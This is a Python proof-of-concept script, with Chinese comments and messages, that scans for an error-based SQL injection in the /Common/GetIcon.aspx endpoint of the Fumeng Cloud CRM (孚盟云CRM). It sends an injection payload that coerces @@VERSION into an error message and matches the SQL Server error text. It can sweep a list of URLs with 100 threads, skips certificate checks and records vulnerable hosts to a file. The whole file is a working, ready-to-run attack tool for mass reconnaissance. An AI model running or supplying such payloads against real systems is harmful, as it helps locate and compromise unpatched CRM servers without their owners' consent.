import argparse, re, requests, sys
from multiprocessing.dummy import Pool

# 关闭 HTTPS 警告
requests.packages.urllib3.disable_warnings()

def banner():
    test = """"""
    print(test)
    print("[*] 孚盟云CRM /Common/GetIcon.aspx 报错型SQL注入漏洞检测")

def poc(target):
    payload = "/Common/GetIcon.aspx?FUID=-1'and+1=@@VERSION--"
    vuln_keyword = "在将 nvarchar 值 'Microsoft SQL Server"

    try:
        res1 = requests.get(url=target, timeout=5, verify=False)
        if res1.status_code == 200:
            res2 = requests.get(url=target + payload, timeout=5, verify=False)
            if vuln_keyword in res2.text:
                print(f"[+] {target} 存在SQL注入漏洞")
                with open('result.txt', 'a', encoding='utf-8') as fp:
                    fp.write(target + '\n')
            else:
                print(f"[-] {target} 不存在SQL注入")
        else:
            print(f"[*] {target} 访问异常，状态码 {res1.status_code}")
    except :
        pass

def main():
    banner()
    parse = argparse.ArgumentParser(description="孚盟云CRM /Common/GetIcon.aspx 报错型SQL注入漏洞检测")
    parse.add_argument('-u', '--url', dest='url', type=str, help="请输入目标链接，例如：http://127.0.0.1:8080")
    parse.add_argument('-f', '--file', dest='file', type=str, help="请输入URL文件路径")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for i in f.readlines():
                url = i.strip()
                if url:
                    url_list.append(url)
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"usage: Python {sys.argv[0]} -u http://target 或 -f url.txt")

if __name__ == "__main__":
    main()
